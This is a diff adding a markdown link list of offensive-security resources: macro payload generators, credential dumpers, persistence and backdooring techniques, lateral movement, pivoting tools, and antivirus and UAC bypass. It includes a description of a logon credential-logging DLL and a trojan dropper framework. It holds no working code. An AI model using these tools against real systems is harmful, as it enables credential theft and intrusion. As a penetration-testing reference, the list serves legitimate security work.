+  * [DLL Tricks with VBA to Improve Offensive Macro Capability](https://labs.mwrinfosecurity.com/blog/dll-tricks-with-vba-to-improve-offensive-macro-capability/)
+
+* Tools
+
+* [MacroShop](https://github.com/khr0x40sh/MacroShop)
+
+  * Collection of scripts to aid in delivering payloads via Office Macros.
+
+* [Generate-Macro](https://github.com/enigma0x3/Generate-Macro)
+
+  * This Powershell script will generate a malicious Microsoft Office document
+    with a specified payload and persistence method.
+
+* [wePWNise](https://github.com/mwrlabs/wePWNise)
+
+  * WePWNise generates architecture independent VBA code to be used in Office
+    documents or templates and automates bypassing application control and
+    exploit mitigation software
+
+### Email/Microsoft Exchange
+
+### Microsoft Exchange
+
+### General
+
+* [Outlook and Exchange for the Bad Guys Nick Landers](https://www.youtube.com/watch?v=cVhc9VOK5MY)
+* [#OLEOutlook - bypass almost every Corporate security control with a point’n’click GUI](https://doublepulsar.com/oleoutlook-bypass-almost-every-corporate-security-control-with-a-point-n-click-gui-37f4cbc107d0)
+* [Ruler Pivoting Through Exchange - Etienne Stalmans - TR17](https://www.youtube.com/watch?v=tuc8cwOAAcA)
+
+### Tools
+
+* [MailSniper](https://github.com/dafthack/MailSniper)
+
+  * MailSniper is a penetration testing tool for searching through email in a
+    Microsoft Exchange environment for specific terms (passwords, insider intel,
+    network architecture information, etc.). It can be used as a
+    non-administrative user to search their own email, or by an administrator to
+    search the mailboxes of every user in a domain.
+
+* [Ruler](https://github.com/sensepost/ruler)
+
+  * Ruler is a tool that allows you to interact with Exchange servers remotely,
+    through either the MAPI/HTTP or RPC/HTTP protocol. The main aim is abuse the
+    client-side Outlook features and gain a shell remotely.
+
+### Grabbing Goodies
+
+### Dumping Passwords
+
+* [CredCrack](https://github.com/gojhonny/CredCrack)
+
+  * CredCrack is a fast and stealthy credential harvester. It exfiltrates
+    credentials recusively in memory and in the clear. Upon completion,
+    CredCrack will parse and output the credentials while identifying any domain
+    administrators obtained. CredCrack also comes with the ability to list and
+    enumerate share access and yes, it is threaded! CredCrack has been tested
+    and runs with the tools found natively in Kali Linux. CredCrack solely
+    relies on having PowerSploit's "Invoke-Mimikatz.ps1" under the /var/www
+    directory.
+
+* [LaZagne](https://github.com/AlessandroZ/LaZagne/blob/master/README.md)
+
+  * The LaZagne project is an open source application used to retrieve lots of
+    passwords stored on a local computer. Each software stores its passwords
+    using different techniques (plaintext, APIs, custom algorithms, databases,
+    etc.). This tool has been developed for the purpose of finding these
+    passwords for the most commonly-used software.
+
+* [KeeThief](https://github.com/HarmJ0y/KeeThief)
+
+  * Methods for attacking KeePass 2.X databases, including extracting of
+    encryption key material from memory.
+
+### Writeups
+
+* [Post exploitation trick - Phish users for creds on domains, from their own box](https://enigma0x3.wordpress.com/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/)
+
+* [Dumping Windows Credentials](https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/)
+
+* [Unofficial Guide to Mimikatz](https://adsecurity.org/?page_id=1821)
+* [Capturing Windows 7 Credentials at Logon Using Custom Credential Provider](https://blog.leetsys.com/2012/01/02/capturing-windows-7-credentials-at-logon-using-custom-credential-provider/)
+
+  * The quick lowdown: I wrote a DLL capable of logging the credentials entered
+    at logon for Windows Vista, 7 and future versions which you can download at
+    http://www.leetsys.com/programs/credentialprovider/cp.zip. The credentials
+    are logged to a file located at c:\cplog.txt. Simply copy the dll to the
+    system32 directory and run the included register.reg script to create the
+    necessary registry settings.
+
+* [Dump Windows password hashes efficiently - Part 1](http://www.bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html)
+
+* [Dumping hashes from Active Directory for cracking](http://blog.spiderlabs.com/2013/11/tutorial-for-ntds-goodness-vssadmin-wmis-ntdsdit-system-.html)
+
+* [NTDSXtract - Active Directory Forensics Framework](http://www.ntdsxtract.com/)
+
+  * This framework was developed by the author in order to provide the community
+    with a solution to extract forensically important information from the main
+    database of Microsoft Active Directory (NTDS.DIT).
+
+* [No one expect command execution!](http://0x90909090.blogspot.fr/2015/07/no-one-expect-command-execution.html)
+
+### Tools
+
+* [You Can Type, but You Can’t Hide: A Stealthy GPU-based Keylogger](http://www.cs.columbia.edu/~mikepo/papers/gpukeylogger.eurosec13.pdf)
+
+  * Keyloggers are a prominent class of malware that harvests sensitive data by
+    recording any typed in information. Key- logger implementations strive to
+    hide their presence using rootkit-like techniques to evade detection by
+    antivirus and other system protections. In this paper, we present a new
+    approach for implementing a stealthy keylogger: we explore the possibility
+    of leveraging the graphics card as an alterna- tive environment for hosting
+    the operation of a keylogger. The key idea behind our approach is to monitor
+    the system’s keyboard buffer directly from the GPU via DMA, without any
+    hooks or modifications in the kernel’s code and data structures besides the
+    page table. The evaluation of our pro- totype implementation shows that a
+    GPU-based keylogger can effectively record all user keystrokes, store them
+    in the memory space of the GPU, and even analyze the recorded data in-place,
+    with negligible runtime overhead.
+
+* [SearchForCC](https://github.com/eelsivart/SearchForCC)
+
+  * A collection of open source/common tools/scripts to perform a system memory
+    dump and/or process memory dump on Windows-based PoS systems and search for
+    unencrypted credit card track data.
+
+* [KeeFarce](https://github.com/denandz/KeeFarce)
+
+  * Extracts passwords from a KeePass 2.x database, directly from memory.
+
+* [KeeThief](https://github.com/HarmJ0y/KeeThief)
+
+  * Methods for attacking KeePass 2.X databases, including extracting of
+    encryption key material from memory.
+
+### Linux
+
+* [mimipenguin](https://github.com/huntergregal/mimipenguin)
+
+  * A tool to dump the login password from the current linux user
+
+### Windows
+
+* [mimikatz](https://github.com/gentilkiwi/mimikatz)
+* [Mimikatz Overview, Defenses and Detection](https://www.sans.org/reading-room/whitepapers/detection/mimikatz-overview-defenses-detection-36780)
+* [Mimikatz Logs and Netcat](http://blackpentesters.blogspot.com/2013/12/mimikatz-logs-and-netcat.html?m=1)
+* [quarkspwdump](https://github.com/quarkslab/quarkspwdump)
+
+  * Dump various types of Windows credentials without injecting in any process.
+
+* [SessionGopher](https://github.com/fireeye/SessionGopher)
+
+  * SessionGopher is a PowerShell tool that uses WMI to extract saved session
+    information for remote access tools such as WinSCP, PuTTY, SuperPuTTY,
+    FileZilla, and Microsoft Remote Desktop. It can be run remotely or locally.
+
+### awareness Gaining Awareness/Situational Awareness
+
+### Situational Awareness
+
+#### Active Directory
+
+* [Domain Trusts: Why You Should Care](http://www.harmj0y.net/blog/redteaming/domain-trusts-why-you-should-care/)
+* [Trusts You Might Have Missed](http://www.harmj0y.net/blog/redteaming/trusts-you-might-have-missed/)
+* [pywerview](https://github.com/the-useless-one/pywerview)
+
+  * A (partial) Python rewriting of PowerSploit's PowerView
+
+* [Veil-PowerView](https://github.com/Veil-Framework/Veil-PowerView)
+
+  * Veil-PowerView is a powershell tool to gain network situational awareness on
+    Windows domains. It contains a set of pure-powershell replacements for
+    various windows "net" commands, which utilize powershell AD hooks and
+    underlying Win32 API functions to perform useful Windows domain
+    functionality.
+
+* [PowerShell-AD-Recon](https://github.com/PyroTek3/PowerShell-AD-Recon)
+
+  * AD PowerShell Recon Scripts
+
+### Linux
+
+* [How to determine Linux guest VM virtualization technology](https://www.cyberciti.biz/faq/linux-determine-virtualization-technology-command/)
+* [How to determine Linux guest VM virtualization technology](https://www.cyberciti.biz/faq/linux-determine-virtualization-technology-command/)
+
+### Egress Testing
+
+* [Egress Testing using PowerShell](http://www.labofapenetrationtester.com/2014/04/egress-testing-using-powershell.html)
+* [Egress Buster Reverse Shell](https://www.trustedsec.com/files/egress_buster_revshell.zip)
+
+  * Egress Buster Reverse Shell – Brute force egress ports until one if found
+    and execute a reverse shell(from trustedsec)
+
+### Network Awareness
+
+* [Packet sniffing with powershell](https://blogs.technet.microsoft.com/heyscriptingguy/2015/10/12/packet-sniffing-with-powershell-getting-started/)
+
+### Miscellaneous
+
+* Finding your external IP: `Simply curl any of the following addresses:
+  ident.me, ifconfig.me or whatsmyip.akamai.com`
+* [Determine Public IP from CLI](http://askubuntu.com/questions/95910/command-for-determining-my-public-ip)
+
+### Persistence
+
+* [List of low-level attacks/persistence techniques. HIGHLY RECOMMENDED!](http://timeglider.com/timeline/5ca2daa6078caaf4)
+
+### Backdooring
+
+* **Articles/Writeups**
+
+* [I'm In Your $PYTHONPATH, Backdooring Your Python Programs](http://www.ikotler.org/InYourPythonPath.pdf)
+* [Introduction to Manual Backdooring - abatchy17](http://www.abatchy.com/2017/05/introduction-to-manual-backdooring_24.html)
+* [An Introduction to Backdooring Operating Systems for Fun and trolling - Defcon22](https://media.defcon.org/DEF%20CON%2022/DEF%20CON%2022%20video%20and%20slides/DEF%20CON%2022%20Hacking%20Conference%20Presentation%20By%20Nemus%20-%20An%20Introduction%20to%20Back%20Dooring%20Operating%20Systems%20for%20Fun%20and%20Trolling%20-%20Video%20and%20Slides.m4v)
+
+  * **Tools**
+
+* [Pyekaboo](https://github.com/SafeBreach-Labs/pyekaboo)
+
+  * Pyekaboo is a proof-of-concept program that is able to to hijack/hook/proxy
+    Python module(s) thanks to $PYTHONPATH variable. It's like "DLL Search Order
+    Hijacking" for Python.
+
+* [Pybuild](https://www.trustedsec.com/files/pybuild.zip)
+
+  * PyBuild is a tool for automating the pyinstaller method for compiling python
+    code into an executable. This works on Windows, Linux, and OSX (pe and elf
+    formats)(From trustedsec)
+
+* [Debinject](https://github.com/UndeadSec/Debinject)
+
+  * Inject malicious code into .debs
+
+* [WSUSpect Proxy](https://github.com/ctxis/wsuspect-proxy/)
+
+  * This is a proof of concept script to inject 'fake' updates into non-SSL WSUS
+    traffic. It is based on our Black Hat USA 2015 presentation, 'WSUSpect –
+    Compromising the Windows Enterprise via Windows Update'
+
+  * [Whitepaper](http://www.contextis.com/documents/161/CTX_WSUSpect_White_Paper.pdf)
+
+### Windows Persistence
+
+* [Windows Event Log Driven Back Doors](http://blakhal0.blogspot.com/2015/03/windows-event-log-driven-back-doors.html)
+* [Thousand ways to backdoor a Windows domain (forest)](http://jumpespjump.blogspot.com/2015/03/thousand-ways-to-backdoor-windows.html)
+* [Windows Firewall Hook Enumeration](https://www.nccgroup.com/en/blog/2015/01/windows-firewall-hook-enumeration/)
+
+  * We’re going to look in detail at Microsoft Windows Firewall Hook drivers
+    from Windows 2000, XP and 2003. This functionality was leveraged by the
+    Derusbi family of malicious code to implement port-knocking like
+    functionality. We’re going to discuss the problem we faced, the required
+    reverse engineering to understand how these hooks could be identified and
+    finally how the enumeration tool was developed.
+
+* [NTFS Alternate Data Streams for pentesters (part 1)](https://labs.portcullis.co.uk/blog/ntfs-alternate-data-streams-for-pentesters-part-1/)
+* [Using Alternate Data Streams to Persist on a Compromised Machine](https://enigma0x3.wordpress.com/2015/03/05/using-alternate-data-streams-to-persist-on-a-compromised-machine/)
+* [WPAD Persistence](http://room362.com/post/2016/wpad-persistence/)
+
+#### Registry
+
+* [Windows Registry Attacks: Knowledge Is the Best Defense](https://www.redcanary.com/blog/windows-registry-attacks-threat-detection/)
+* [Windows Registry Persistence, Part 1: Introduction, Attack Phases and Windows Services](http://blog.cylance.com/windows-registry-persistence-part-1-introduction-attack-phases-and-windows-services)
+* [Windows Registry Persistence, Part 2: The Run Keys and Search-Order](http://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order)
+* [List of autorun keys / malware persistence Windows registry entries](https://www.peerlyst.com/posts/list-of-autorun-keys-malware-persistence-windows-registry-entries-benjamin-infosec)
+
+#### SC/Scheduled Tasks
+
+* [Sc](https://technet.microsoft.com/en-us/library/cc754599.aspx)
+
+  * Communicates with the Service Controller and installed services. The SC.exe
+    program provides capabilities similar to those provided in Services in the
+    Control Panel.
+
+* [schtasks](https://technet.microsoft.com/en-us/library/cc725744.aspx)
+* [Script Task](https://docs.microsoft.com/en-us/sql/integration-services/control-flow/script-task)
+
+  * Persistence Via MSSQL
+
+#### bitsadmin
+
+* [Temporal Persistence with bitsadmin and schtasks](http://0xthem.blogspot.com/2014/03/t-emporal-persistence-with-and-schtasks.html)
+  /userland-persistence-with-scheduled-tasks-and-com-handler-hijacking/)
+
+#### COM
+
+* [COM Object hijacking: the discreet way of persistence](https://blog.gdatasoftware.com/blog/article/com-object-hijacking-the-discreet-way-of-persistence.html)
+* [Userland Persistence with Scheduled Tasks and COM Handler Hijacking](https://enigma0x3.net/2016/05/25)
+
+#### Startup
+
+* [Windows Startup Application Database](http://www.pacs-portal.co.uk/startup_content.php)
+* [SYSTEM Context Persistence in GPO Startup Scripts](https://cybersyndicates.com/2016/01/system-context-persistence-in-gpo-startup/)
+
+#### Shims
+
+* [Post Exploitation Persistence With Application Shims (Intro)](http://blacksunhackers.club/2016/08/post-exploitation-persistence-with-application-shims-intro/)
+* [Shim Database Talks](http://sdb.tools/talks.html)
+
+#### Windows Instrumentation Management
+
+* [Abusing Windows Management Instrumentation (WMI) to Build a Persistent, Asyncronous, and Fileless Backdoor](https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf)
+
+### Linux Persistence
+
+### OS X Persistence
+
+* [What's the easiest way to have a script run at boot time in OS X? - Stack Overflow](https://superuser.com/questions/245713/whats-the-easiest-way-to-have-a-script-run-at-boot-time-in-os-x)
+* [Userland Persistence On Mac Os X "It Just Works" - Shmoocon 2015](http://www.securitytube.net/video/12428?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed:%20SecurityTube%20%28SecurityTube.Net%29)
+
+  * Got root on OSX? Do you want to persist between reboots and have access
+    whenever you need it? You do not need plists, new binaries, scripts, or
+    other easily noticeable techniques. Kext programming and kernel patching can
+    be troublesome! Leverage already running daemon processes to guarantee your
+    access. As the presentation will show, if given userland administrative
+    access (read: root), how easy it is to persist between reboots without
+    plists, non-native binaries, scripting, and kexts or kernel patching using
+    the Backdoor Factory.
+
+### Pivoting and Lateral movement:
+
+### Lateral Movement Techniques
+
+* [Lateral movement using excel application and dcom](https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)
+
+### Pass-The-Hash
+
+* [PsExec and the Nasty Things It Can Do](http://www.windowsecurity.com/articles-tutorials/misc_network_security/PsExec-Nasty-Things-It-Can-Do.html)
+
+  * An overview of what PsExec is and what its capabilities are from an
+    administrative standpoint.
+
+* [smbexec](https://github.com/pentestgeek/smbexec)
+
+  * A rapid psexec style attack with samba tools
+
+* [Blogpost that inspired it](http://carnal0wnage.attackresearch.com/2012/01/psexec-fail-upload-and-exec-instead.html)
+* [pth-toolkit I.e Portable pass the hash toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
+
+  * A modified version of the passing-the-hash tool collection
+
+* https://code.google.com/p/passing-the-hash/ designed to be portable and work
+  straight out of the box even on the most 'bare bones' systems
+* [Pass-the-Hash is Dead: Long Live Pass-the-Hash](http://www.harmj0y.net/blog/penetesting/pass-the-hash-is-dead-long-live-pass-the-hash/)
+* [Still Passing the Hash 15 Years Later: Using Keys to the Kingdom to Access Data - BH 2012](https://www.youtube.com/watch?v=O7WRojkYR00)
+* [Still Passing the Hash 15 Years Later](http://passing-the-hash.blogspot.com/)
+* [The Evolution of Protected Processes Part 1: Pass-the-Hash Mitigations in Windows 8.1](http://www.alex-ionescu.com/?p=97)
+* [Et tu Kerberos - Christopher Campbell](https://www.youtube.com/watch?v=RIRQQCM4wz8)
+
+  * For over a decade we have been told that Kerberos is the answer to
+    Microsoft’s authentication woes and now we know that isn’t the case. The
+    problems with LM and NTLM are widely known- but the problems with Kerberos
+    have only recently surfaced. In this talk we will look back at previous
+    failures in order to look forward. We will take a look at what recent
+    problems in Kerberos mean to your enterprise and ways you could possibly
+    mitigate them. Attacks such as Spoofed-PAC- Pass-the-Hash- Golden Ticket-
+    Pass-the-Ticket and Over-Pass-the-Ticket will be explained. Unfortunately-
+    we don’t really know what is next – only that what we have now is broken.
+
+### Pivoting
+
+### Articles - More on Using Bash's Built-in /dev/tcp File
+
+* [TCP/IP](http://www.linuxjournal.com/content/more-using-bashs-built-devtcp-file-tcpip)
+
+  * More on Using Bash's Built-in /dev/tcp File (TCP/IP)
+
+* [The Grammar of WMIC](https://isc.sans.edu/diary/The+Grammar+of+WMIC/2376) \_
+  [Authenticated Remote Code Execution Methods in Windows](https://www.scriptjunkie.us/2013/02/authenticated-remote-code-execution-methods-in-windows/)
+* [SOCKS: A protocol for TCP proxy across firewalls](https://www.openssh.com/txt/socks4.protocol)
+* [A Red Teamer's guide to pivoting](https://artkond.com/2017/03/23/pivoting-guide/#corporate-http-proxy-as-a-way-out)
+* [Pivoting Ssh Reverse Tunnel Gateway](http://blog.oneiroi.co.uk/linux/pivoting-ssh-reverse-tunnel-gateway/)
+* [Pivoting into a network using PLINK and FPipe](http://exploit.co.il/hacking/pivoting-into-a-network-using-plink-and-fpipe/)
+* [Portfwd - Pivot from within meterpreter](http://www.offensive-security.com/metasploit-unleashed/Portfwd)
+* [SSH Gymnastics and Tunneling with ProxyChains](http://magikh0e.ihtb.org/pubPapers/ssh_gymnastics_tunneling.html)
+* [SSH Cheat Sheet - pentestmonkey](http://pentestmonkey.net/cheat-sheet/ssh-cheat-sheet)
+* [Reverse SSL backdoor with socat and metasploit (and proxies)](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
+* [How VPN Pivoting Works (with Source Code) - cs](https://blog.cobaltstrike.com/2014/10/14/how-vpn-pivoting-works-with-source-code/)
+* [Universal TUN/TAP device driver. - kernel.org](https://www.kernel.org/pub/linux/kernel/people/marcelo/linux-2.4/Documentation/networking/tuntap.txt)
+* [Tun/Tap interface tutorial - backreference](http://backreference.org/2010/03/26/tuntap-interface-tutorial/)
+* [Pillage the Village Redux w/ Ed Skoudis & John Strand - SANS](https://www.youtube.com/watch?v=n2nptntIsn4)
+
+  * Decrypting IIS Passwords to Break Out of the DMZ
+
+* [Decrypting IIS Passwords to Break Out of the DMZ: Part 1 ](https://blog.netspi.com/decrypting-iis-passwords-to-break-out-of-the-dmz-part-1/)
+* [Decrypting IIS Passwords to Break Out of the DMZ: Part 2](https://blog.netspi.com/decrypting-iis-passwords-to-break-out-of-the-dmz-part-2/)
+
+###Tools
+
+* [Piper](https://github.com/p3nt4/Piper)
+
+  * Creates a local or remote port forwarding through named pipes.
+
+* [Socat](http://www.dest-unreach.org/socat/)
+
+  * socat is a relay for bidirectional data transfer between two independent
+    data channels. Each of these data channels may be a file, pipe, device
+    (serial line etc. or a pseudo terminal), a socket (UNIX, IP4, IP6 - raw,
+    UDP, TCP), an SSL socket, proxy CONNECT connection, a file descriptor (stdin
+    etc.), the GNU line editor (readline), a program, or a combination of two of
+    these. These modes include generation of "listening" sockets, named pipes,
+    and pseudo terminals.
+
+* [Examples of use](http://www.dest-unreach.org/socat/doc/socat.html#EXAMPLES)
+* [Socat Cheatsheet](http://www.blackbytes.info/2012/07/socat-cheatsheet/)
+* [SSHDog](https://github.com/Matir/sshdog)
+
+  * SSHDog is your go-anywhere lightweight SSH server. Written in Go, it aims to
+    be a portable SSH server that you can drop on a system and use for remote
+    access without any additional configuration.
+
+* [SharpSocks](https://github.com/nettitude/SharpSocks)
+
+  * Tunnellable HTTP/HTTPS socks4a proxy written in C# and deployable via
+    PowerShell
+
+* [ssf - Secure Socket Funneling](https://github.com/securesocketfunneling/ssf)
+
+  * Network tool and toolkit. It provides simple and efficient ways to forward
+    data from multiple sockets (TCP or UDP) through a single secure TLS tunnel
+    to a remote computer. SSF is cross platform (Windows, Linux, OSX) and comes
+    as standalone executables.
+
+* [PowerCat](https://github.com/secabstraction/PowerCat)
+
+  * A PowerShell TCP/IP swiss army knife that works with Netcat & Ncat
+
+* [Udp2raw-tunnel](https://github.com/wangyu-/udp2raw-tunnel)
+
+  * A Tunnel which tunnels UDP via FakeTCP/UDP/ICMP Traffic by using Raw Socket,
+    helps you Bypass UDP FireWalls(or Unstable UDP Environment). Its Encrypted,
+    Anti-Replay and Multiplexed. It also acts as a Connection Stabilizer.)
+
+* [reGeorg](https://github.com/sensepost/reGeorg)
+
+* The successor to reDuh, pwn a bastion webserver and create SOCKS proxies
+  through the DMZ. Pivot and pwn.
+
+### Avoiding/Bypassing AV(Anti-Virus)/UAC/Whitelisting/Sandboxes/etc
+
+* [Noob 101: Practical Techniques for AV Bypass - Jared Hoffman - ANYCON 2017](http://www.irongeek.com/i.php?page=videos/anycon2017/103-noob-101-practical-techniques-for-av-bypass-jared-hoffman)
+
+  * The shortcomings of anti-virus (AV) solutions have been well known for some
+    time. Nevertheless, both public and private organizations continue to rely
+    on AV software as a critical component of their information security
+    programs, acting as a key protection mechanism over endpoints and other
+    information systems within their networks. As a result, the security posture
+    of these organizations is significantly jeopardized by relying only on this
+    weakened control.
+
+* [Batch, attach and patch: using windbg’s local kernel debugger to execute code in windows kernel](https://vallejo.cc/2015/06/07/batch-attach-and-patch-using-windbgs-local-kernel-debugger-to-execute-code-in-windows-kernel/)
+
+  * In this article I am going to describe a way to execute code in windows
+    kernel by using windbg local kernel debugging. It’s not a vulnerability, I
+    am going to use only windbg’s legal functionality, and I am going to use
+    only a batch file (not powershell, or vbs, an old style batch only) and some
+    Microsoft’s signed executables (some of them that are already in the system
+    and windbg, that we will be dumped from the batch file). With this method it
+    is not necessary to launch executables at user mode (only Microsoft signed
+    executables) or load signed drivers. PatchGuard and other protections don’t
+    stop us. We put our code directly into kernel memory space and we hook some
+    point to get a thread executing it. As we will demonstrate, a malware
+    consisting of a simple batch file would be able to jump to kernel, enabling
+    local kernel debugging and using windbg to get its code being executed in
+    kernel.
+
+* [Research on CMSTP.exe](https://msitpros.com/?p=3960)
+
+  * Methods to bypass UAC and load a DLL over webdav
+
+* [Bypass Cylance Memory Exploitation Defense & Script Cntrl](https://www.xorrior.com/You-Have-The-Right-to-Remain-Cylance/)
+* [Learn how to hide your trojans, backdoors, etc from anti virus.](https://www.hellboundhackers.org/articles/read-article.php?article_id=842)
+* [AVLeak: Fingerprinting Antivirus Emulators Through Black-Box Testing](https://www.usenix.org/system/files/conference/woot16/woot16-paper-blackthorne_update.pdf)
+* [rundll32 lockdown testing goodness](https://www.attackdebris.com/?p=143)
+* [VMware Escape Exploit](https://github.com/unamer/vmware_escape)
+
+  * VMware Escape Exploit before VMware WorkStation 12.5.5
+
+* [Breaking out of secured Python environments](http://tomforb.es/breaking-out-of-secured-python-environments)
+* [Collection of Symantec Endpoint Protection Vulnerabilities + some exploits](http://codewhitesec.blogspot.nl/2015/07/symantec-endpoint-protection.html)
+* [Hack Microsoft Using Microsoft Signed Binaries - Pierre-Alexandre Braeken](https://www.youtube.com/watch?v=V9AJ9M8_-RE&list=PLuUtcRxSUZUpv2An-RNhjuZSJ5fjY7ghe&index=15)
+* [Hack Microsoft Using Microsoft Signed Binaries - BH17 - pierre - alexandre braeken](https://www.blackhat.com/docs/asia-17/materials/asia-17-Braeken-Hack-Microsoft-Using-Microsoft-Signed-Binaries-wp.pdf)
+
+  * Imagine being attacked by legitimate software tools that cannot be detected
+    by usual defender tools. How bad could it be to be attacked by malicious
+    threat actors only sending bytes to be read and bytes to be written in order
+    to achieve advanced attacks? The most dangerous threat is the one you can’t
+    see. At a time when it is not obvious to detect memory attacks using API
+    like VirtualAlloc, what would be worse than having to detect something like
+    “f 0xffffe001`0c79ebe8+0x8 L4 0xe8 0xcb 0x04 0x10”? We will be able to
+    demonstrate that we can achieve every kind of attacks you can imagine using
+    only PowerShell and a Microsoft Signed Debugger. We can retrieve passwords
+    from the userland memory, execute shellcode by dynamically parsing loaded PE
+    or attack the kernel achieving advanced persistence inside any system.
+
+* [MemoryModule](https://github.com/fancycode/MemoryModule)
+
+  * MemoryModule is a library that can be used to load a DLL completely from
+    memory - without storing on the disk first.
+
+* [RogueMMC](https://github.com/subTee/RogueMMC)
+
+  * ExecuteShellcode And Other Goodies From MMC
+
+### Bypassing UAC
+
+* [Bypassing UAC on Windows 10 using Disk Cleanup](https://enigma0x3.net/2016/07/22/bypassing-uac-on-windows-10-using-disk-cleanup/)
+* [Research on CMSTP.exe](https://msitpros.com/?p=3960)
+
+  * Methods to bypass UAC and load a DLL over webdav
+
+* [“Fileless” UAC Bypass Using eventvwr.exe and Registry Hijacking](https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/)
+* [Bypassing UAC using App Paths](https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/)
+* [“Fileless” UAC Bypass Using eventvwr.exe and Registry Hijacking](https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/)
+* [Bypass-UAC](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC)
+* [Reading Your Way Around UAC (Part 1)](https://tyranidslair.blogspot.no/2017/05/reading-your-way-around-uac-part-1.html)
+* [Reading Your Way Around UAC (Part 2)](https://tyranidslair.blogspot.no/2017/05/reading-your-way-around-uac-part-2.html)
+* [Reading Your Way Around UAC (Part 3)](https://tyranidslair.blogspot.no/2017/05/reading-your-way-around-uac-part-3.html)
+* [Fileless UAC Bypass using sdclt](https://posts.specterops.io/fileless-uac-bypass-using-sdclt-exe-3e9f9ad4e2b3)
+* [Eventvwr File-less UAC Bypass CNA](https://www.mdsec.co.uk/2016/12/cna-eventvwr-uac-bypass/)
+
+### Anti-Virus
+
+### Articles
+
+* [How to Bypass Anti-Virus to Run Mimikatz](http://www.blackhillsinfosec.com/?p=5555)
+* [pecloak.py - An Experiment in AV evasion](http://www.securitysift.com/pecloak-py-an-experiment-in-av-evasion/)
+* [Practical Anti-virus Evasion - Daniel Sauder](https://govolutionde.files.wordpress.com/2014/05/avevasion_pentestmag.pdf)
+* [Why Anti-Virus Software Fails](https://deepsec.net/docs/Slides/2014/Why_Antivirus_Fails_-_Daniel_Sauder.pdf)
+* [avepoc](https://github.com/govolution/avepoc)
+
+  * Some pocs for antivirus evasion
+
+* [Sacred Cash Cow Tipping 2017 - BlackHills Infosec](https://www.youtube.com/watch?v=SVwv1dZCtWM)
+
+  * We're going to bypass most of the major antivirus programs. Why? 1) Because
+    it's fun. 2) Because it'll highlight some of the inherent weaknesses in our
+    environments today.
+
+* [Deep Dive Into Stageless Meterpreter Payloads](https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/)
+* [Execute ShellCode Using Python](http://www.debasish.in/2012/04/execute-shellcode-using-python.html)
+
+* In this article I am going to show you, how can we use python and its "ctypes"
+  library to execute a "calc.exe" shell code or any other shell code.
+
+### Bypassing
+
+* [Execute ShellCode Using Python](http://www.debasish.in/2012/04/execute-shellcode-using-python.html)
+
+* In this article I am going to show you, how can we use python and its "ctypes"
+  library to execute a "calc.exe" shell code or any other shell code.
+
+* [In-Memory Managed Dll Loading With PowerShell - 2012](http://www.exploit-monday.com/2012/12/in-memory-dll-loading.html)
+* [Generic bypass of next-gen intrusion / threat / breach detection systems](https://blog.mrg-effitas.com/generic-bypass-of-next-gen-intrusion-threat-breach-detection-systems/)
+
+  * The focus of this blog post is to bypass network monitoring tools, e.g.
+    good-old IDS or next-generation threat detection systems in a generic way.
+    The focus is on the exploit delivery.
+
+* [Meterpreter stage AV/IDS evasion with powershell](https://arno0x0x.wordpress.com/2016/04/13/meterpreter-av-ids-evasion-powershell/)
+* [Customising Meterpreter Loader DLL part. 2](https://astr0baby.wordpress.com/2014/02/13/customising-meterpreter-loader-dll-part-2/)
+* [Facts and myths about antivirus evasion with Metasploit - mihi - 2011](http://schierlm.users.sourceforge.net/avevasion.html)
+
+  * This article tries to given an overview about the current executable
+    generation scheme of Metasploit, how AV detects them, and how to evade them.
+    Note that this document only covers standalone EXE files (for Windows) that
+    replace an EXE template's functionality, and not other payloads for
+    exploits, service executables (like for the windows/psexec exploit) or
+    executables that merely add to the original template's functionality (like
+    the -k option of msfpayload).
+
+### Tools
+
+* [AVSignSeek](https://github.com/hegusung/AVSignSeek)
+
+  * Tool written in python3 to determine where the AV signature is located in a
+    binary/payload
+
+* [SpookFlare: Stay In Shadows](https://artofpwn.com/spookflare.html?)
+* [SpookFlare - Github](https://github.com/hlldz/SpookFlare)
+* [avet framework](https://github.com/govolution/avet)
+
+  * AVET is an AntiVirus Evasion Tool, which was developed for making life
+    easier for pentesters and for experimenting with antivirus evasion
+    techniques. In version 1.1 lot of stuff was introduced, for a complete
+    overview have a look at the CHANGELOG file. Now 64bit payloads can also be
+    used, for easier usage I hacked a small build tool (avet_fabric.py).
+
+* [Don't Kill My Cat (DKMC)](https://github.com/Mr-Un1k0d3r/DKMC)
+
+  * Don't kill my cat is a tool that generates obfuscated shellcode that is
+    stored inside of polyglot images. The image is 100% valid and also 100%
+    valid shellcode. The idea is to avoid sandbox analysis since it's a simple
+    "legit" image. For now the tool rely on PowerShell the execute the final
+    shellcode payload.
+
+* [Presentation - Northsec2017](https://www.youtube.com/watch?v=7kNwbXgWdX0&list=PLuUtcRxSUZUpv2An-RNhjuZSJ5fjY7ghe&index=9)
+* [Dr0p1t-Framework](https://github.com/D4Vinci/Dr0p1t-Framework)
+
+  * Have you ever heard about trojan droppers ? In short dropper is type of
+    trojans that downloads other malwares and Dr0p1t gives you the chance to
+    create a stealthy dropper that bypass most AVs and have a lot of tricks (
+    Trust me :D ) ;)
+
+* [PowerLine](https://github.com/fullmetalcache/powerline)
+* [Presentation](https://www.youtube.com/watch?v=HiAtkLa8FOc)
+* [Invoke-CradleCrafter: Moar PowerShell obFUsk8tion by Daniel Bohannon](https://www.youtube.com/watch?feature=youtu.be&v=Nn9yJjFGXU0&app=desktop)
+* [Invoke-CradleCrafter v1.1](https://github.com/danielbohannon/Invoke-CradleCrafter)
+* [wePWNise](https://github.com/mwrlabs/wePWNise)
+
+  * WePWNise generates architecture independent VBA code to be used in Office
+    documents or templates and automates bypassing application control and
+    exploit mitigation software
+
